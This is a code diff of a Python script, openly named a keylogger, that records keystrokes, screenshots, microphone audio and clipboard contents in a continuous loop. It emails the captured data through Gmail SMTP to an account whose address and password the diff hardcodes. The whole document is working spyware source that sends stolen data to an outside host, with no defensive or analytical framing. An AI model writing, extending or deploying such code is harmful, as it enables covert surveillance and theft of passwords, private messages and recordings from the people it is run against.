@@ -1,12 +1,18 @@
+#!usr/bin/rnv/python3
+
 # for captuing screenshot
 import pyscreenshot
+
 # for capturing key strokes
 import pynput.keyboard
+
 # for threading
 import threading
+
 # for recording and saving audio
 import sounddevice as sd
 from scipy.io.wavfile import write
+
 # for sending mail with attachment
 import smtplib
 from email.mime.text import MIMEText
@@ -14,17 +20,23 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
+#for capturing clipboard
+import clipboard
 
 class keylogger:
 
-    def __init__(self,id1,id2,pswd):
-
+    def __init__(self,id,pswd):
+        self.temp = ""
         self.log = ""
+        self.id = id
+        self.pswd = pswd
 
     def screenshot(self):
         image = pyscreenshot.grab()
         image.save("screenshot.jpg")
+        self.clip()
         self.mail("screenshot.jpg")
+
 
     def audio(self):
         fs = 44100  # Sample rate
@@ -34,16 +46,13 @@ class keylogger:
         sd.wait()  # Wait until recording is finished
         write('output.wav', fs, myrecording)  # Save as WAV file
         self.mail("output.wav")
-        self.screenshot()
-        timer = threading.Timer(0,self.audio)
-        timer.start()
 
     def mail(self,file):
 
         message = MIMEMultipart()
 
-        message["From"] = id1
-        message["To"] = id2
+        message["From"] = self.id
+        message["To"] = self.id
 
         attachment = open(file,'rb')
         body = self.log
@@ -62,10 +71,19 @@ class keylogger:
 
         server = smtplib.SMTP('smtp.gmail.com',587)
         server.starttls()
-        server.login(id1,pswd)
-        server.sendmail(id1,id2,my_message)
+        server.login(self.id,self.pswd)
+        server.sendmail(self.id,self.id,my_message)
         self.log = ""
         server.quit()
+
+    def clip(self):
+        text = clipboard.paste()
+        if text == self.temp:
+            pass
+        else:
+            self.temp = text
+            self.add_to_log(self.temp)
+
 
     def add_to_log(self,k):
         self.log = self.log + k
@@ -80,11 +98,18 @@ class keylogger:
                 k = " " + (str(key)) + " "
         self.add_to_log(k)
 
+    def advance(self):
+        self.clip()
+        self.audio()
+        self.screenshot()
+        timer = threading.Timer(0,self.advance)
+        timer.start()
+
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
         with keyboard_listener:
-            self.audio()
+            self.advance()
             keyboard_listener.join()
 
-obj = keylogger(id1,id2,pswd)
+obj = keylogger("tt709218@gmail.com","qaz123!@")
 obj.start()
